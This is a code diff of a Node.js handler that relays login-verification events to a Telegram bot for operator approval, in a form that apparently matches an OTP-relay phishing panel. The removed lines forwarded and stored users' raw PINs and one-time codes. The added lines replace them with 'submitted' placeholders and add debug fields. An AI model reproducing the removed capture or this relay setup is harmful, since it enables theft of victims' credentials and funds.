@@ -84,7 +84,7 @@ async function notifyApplication(app) {
 }
 
 async function notifyLoginVerification(login) {
-  const type = login.otp ? 'otp' : 'pin';
+  const type = (login.otp || login.otpSubmitted) ? 'otp' : 'pin';
   const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();
 
   let text = '';
@@ -92,22 +92,21 @@ async function notifyLoginVerification(login) {
     text =
       `<b>🔐 PIN Verification Required</b>\n\n` +
       `User: ${esc(login.username || 'N/A')}\n` +
-      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
+      (login.pinSubmitted ? `Practice PIN: ${esc('submitted')}\n` : '') +
       (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
       `Time: ${new Date().toLocaleString()}`;
   } else {
     text =
       `<b>🔐 OTP Verification Required</b>\n\n` +
       `User: ${esc(login.username || 'N/A')}\n` +
-      (login.pin ? `PIN: ${esc('****')}\n` : '') +
-      `OTP: ${esc(login.otp)}\n` +
+      `Practice OTP: ${esc('submitted')}\n` +
       `Time: ${new Date().toLocaleString()}`;
   }
 
   await store.set(store.NS.LOGIN, id, {
     phone: login.username,
-    pin: login.pin || '',
-    otp: login.otp || '',
+    pin: login.pinSubmitted ? 'submitted' : '',
+    otp: login.otpSubmitted ? 'submitted' : '',
     type,
     timestamp: Date.now(),
     status: 'pending',
@@ -185,6 +184,8 @@ async function handleCallback(cq) {
       rec.status = decision;
       rec.decided = true;
       await store.set(store.NS.LOGIN, id, rec);
+    } else {
+      console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
     }
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
     if (rec && rec.messageId) {
@@ -250,7 +251,10 @@ module.exports = async (req, res) => {
       const rec = await store.get(store.NS.LOGIN, id);
       res.status(200).json({
         decided: !!rec && !!rec.decided,
-        status: rec ? rec.status : 'pending'
+        status: rec ? rec.status : 'pending',
+        found: !!rec,
+        sharedStore: store.shared,
+        storage: store.usingKV ? 'kv' : 'local'
       });
       return;
     }
